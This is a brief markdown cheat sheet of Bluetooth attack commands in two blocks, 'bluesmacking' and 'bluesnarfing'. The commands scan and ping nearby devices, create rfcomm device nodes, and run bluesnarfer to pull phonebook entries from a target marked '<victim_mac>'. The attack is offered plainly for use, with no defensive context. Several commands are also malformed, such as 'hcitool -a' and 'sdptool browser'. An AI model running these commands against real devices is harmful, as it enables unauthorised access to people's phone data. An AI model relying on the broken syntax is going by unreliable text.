# bluetooth

## bluesmacking

```
hcitool -a
hcitool hci0 up
hcitool scan
hcitool inq
sdptool browser <MAC_ADDRESS>
l2ping <mac_address>
```

# bluesnarfing

```
mkdir -p /dev/bluetooth/rfcomm
mknod -m 666 /dev/bluetooth/rfcomm/0 c 216 0
mknod --mode=666 /dev/rfcomm0 c 216 0
hciconfig -i hci0 up
hciconfig hci0
l2ping <victim_mac>
sdptool browser --tree -l2cap <mac>
bluesnarfer -r 1-100 -C 7 -b <mac>
```
